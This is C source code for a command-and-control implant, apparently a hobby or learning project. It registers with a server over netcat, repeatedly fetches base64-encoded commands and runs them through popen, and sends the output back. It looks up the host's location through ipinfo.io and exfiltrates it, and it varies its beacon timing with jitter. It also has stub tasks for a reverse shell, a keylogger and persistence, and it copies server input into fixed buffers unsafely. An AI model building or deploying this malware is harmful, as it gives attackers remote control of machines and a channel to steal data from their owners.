#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include "base64.h"

char uid[64];
double sleep_time = 5;
double jitter = 0.0;

void get_uid() {
    FILE *fp;
    char result[1024];
    
    fp = popen("echo 'DECLARE,client,linux,terminal' | nc 127.0.0.1 8080", "r");
    fgets(result, sizeof(result), fp);
    pclose(fp);
    
    // expected format: "Ok, ad8895843b")
    strtok(result, ",");         // ignore the first field
    char *id = strtok(NULL, ",");
    
    // Trim trailing whitespace and newlines
    if (id != NULL) {
        char *end = id + strlen(id) - 1;
        while (end > id && (*end == ' ' || *end == '\n' || *end == '\r')) {
            *end = '\0';
            end--;
        }
    }
    
    strcpy(uid, id);
    
    printf("My UID: '%s'\n", uid);
}

void task_execve(char *command_str, char *argument_str, const char *id_task) {
    printf("Executing task execve\n");
    
    // decoding command and argument
    char *command = decode(command_str);
    char *argument = NULL;
    
    if (argument_str != NULL) {
        argument = decode(argument_str);
    }
    
    // string concatenation
    char full_command[4096] = {0};
    strcpy(full_command, command);
    
    if (argument != NULL) {
        strcat(full_command, " ");
        strcat(full_command, argument);
    }
    
    printf("Executing command: %s\n", full_command);
    
    // execute the command and capture output
    char result_buffer[4096] = {0};
    FILE *fp = popen(full_command, "r");
    
    // Read output
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
    }
    
    // Send the result back to the server
    if (strlen(result_buffer) > 0) {
        // encoding and sending the result
        char *encoded_result = encode(result_buffer);
        char cmd[2048];
        printf("Sending result: echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080\n", uid, id_task, encoded_result);
        
        snprintf(cmd, sizeof(cmd), "echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080", uid, id_task, encoded_result);
        
        // execution and capture the response
        char response[1024] = {0};
        FILE *cmd_fp = popen(cmd, "r");
        if (cmd_fp != NULL) {
            fgets(response, sizeof(response), cmd_fp);
            pclose(cmd_fp);
            printf("Server response: %s\n", response);
        } else {
            perror("Error sending the result");
        }
        
        free(encoded_result);
    } else {
        printf("No command output to send\n");
    }
    
    free(command);
    if (argument) free(argument);
}

void task_sleep(char *sleep_time_str, char *jitter_str) {
    printf("Executing task sleep\n");
    
    if (sleep_time_str != NULL) {
        char *decoded_sleep = decode(sleep_time_str);
        if (decoded_sleep != NULL) {
            sleep_time = atof(decoded_sleep);
            printf("New sleep time: %.2f seconds\n", sleep_time);
            free(decoded_sleep);
        }
    }

    if (jitter_str != NULL) {
        char *decoded_jitter = decode(jitter_str);
        if (decoded_jitter != NULL) {
            jitter = atof(decoded_jitter);
            printf("Jitter: %.2f%%\n", jitter);
            free(decoded_jitter);
        }
    }
    
    return;
}

void calculate_random_sleep_time() {
    double time_1 = sleep_time - (jitter/100.0 * sleep_time);
    double time_2 = sleep_time + (jitter/100.0 * sleep_time);
    
    // seeding random number generator
    srand(time(NULL));
    
    double random_factor = (double)rand() / RAND_MAX;
    sleep_time = time_1 + random_factor * (time_2 - time_1);
}

void task_locate(const char *id_task) {
    printf("Executing task locate\n");

    char result_buffer[4096];
    memset(result_buffer, 0, sizeof(result_buffer));

    // get localisation info with ipinfo.io
    FILE *fp = popen("curl -s ipinfo.io", "r");
    if (fp == NULL) {
        perror("Error executing curl");
        return;
    }

    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(result_buffer, buffer);
    }
    pclose(fp);

    char *encoded_result = encode(result_buffer);
    if (encoded_result == NULL) {
        printf("Error encoding to base64\n");
        return;
    }

    // building and executing the command
    // expected format : "RESULT,uid,id_task,encoded_result")
    char cmd[2048];
    printf("command executed : echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080\n", uid, id_task, encoded_result);
    
    // Ensure proper command formatting with cleaned UID
    snprintf(cmd, sizeof(cmd), "echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080", uid, id_task, encoded_result);
    
    // Execute and capture the response
    char response[1024] = {0};
    FILE *cmd_fp = popen(cmd, "r");
    if (cmd_fp != NULL) {
        fgets(response, sizeof(response), cmd_fp);
        pclose(cmd_fp);
        printf("Server response: %s\n", response);
    } else {
        perror("Error sending the result");
    }

    // free memory
    free(encoded_result);
}

void task_revshell() {
    printf("Executing task revshell\n");
    return;
}

void task_keylog() {
    printf("Executing task keylog\n");
    return;
}

void task_persist() {
    printf("Executing task persist\n");
    return;
}

void task_cat() {
    printf("Executing task cat\n");
    return;
}

void task_mv() {
    printf("Executing task mv\n");
    return;
}

void task_rm() {
    printf("Executing task rm\n");
    return;
}

void task_ps() {
    printf("Executing task ps\n");
    return;
}

void task_netstat() {
    printf("Executing task netstat\n");
    return;
}

void execute_server_command(const char *command, char *result, size_t result_size) {
    FILE *fp = popen(command, "r");
    if (fp == NULL) {
        perror("Error executing the command");
        result[0] = '\0';
        return;
    }
    if (fgets(result, result_size, fp) == NULL) {
        perror("Error reading the response");
        result[0] = '\0';
    }
    pclose(fp);
}

void check_commands() {
    char cmd[256];
    char result[1024];
    
    sprintf(cmd, "echo 'FETCH,%s' | nc 127.0.0.1 8080", uid);
    execute_server_command(cmd, result, sizeof(result));
    
    printf("Server response: %s\n", result);
    
    // Check if the server returns an error
    if (strncmp(result, "ERROR", 5) == 0) {
        printf("Error received from the server: %s\n", result);
        return;
    }
    
    // expected format : "type,id_task,command,argument")
    char *type = strtok(result, ",");
    
    if (type != NULL) {
        char *id_task = strtok(NULL, ",");
        if (strcmp(type, "EXECVE") == 0) {
            char *command = strtok(NULL, ",");
            char *argument = strtok(NULL, ",");  // Get the argument as well
            task_execve(command, argument, id_task);
        } else if (strcmp(type, "SLEEP") == 0) {
            char *sleep_time = strtok(NULL, ",");
            char *jitter = strtok(NULL, ",");
            task_sleep(sleep_time, jitter);
        } else if (strcmp(type, "LOCATE") == 0) {
            task_locate(id_task);
        } else if (strcmp(type, "REVSHELL") == 0) {
            task_revshell();
        } else if (strcmp(type, "KEYLOG") == 0) {
            task_keylog();
        } else if (strcmp(type, "PERSIST") == 0) {
            task_persist();
        } else if (strcmp(type, "CAT") == 0) {
            task_cat();
        } else if (strcmp(type, "MV") == 0) {
            task_mv();
        } else if (strcmp(type, "RM") == 0) {
            task_rm();
        } else if (strcmp(type, "PS") == 0) {
            task_ps();
        } else if (strcmp(type, "NETSTAT") == 0) {
            task_netstat();
        } else {
            printf("Unknown or unsupported type: %s\n", type);
        }
    } else {
        printf("Malformed or empty response.\n");
    }
}

int main() {
    // Initialize the decoding table
    build_decoding_table();
    
    // step 1 : get uid
    get_uid();
    
    while (1) {
        // step 2 : check tasks
        printf("\nChecking commands...\n");
        check_commands();
        
        // step 3 : sleep
        calculate_random_sleep_time();
        
        printf("Pause of %.2f seconds\n", sleep_time);
        sleep(sleep_time);
    }
    
    // cleaning
    base64_cleanup();
    return 0;
}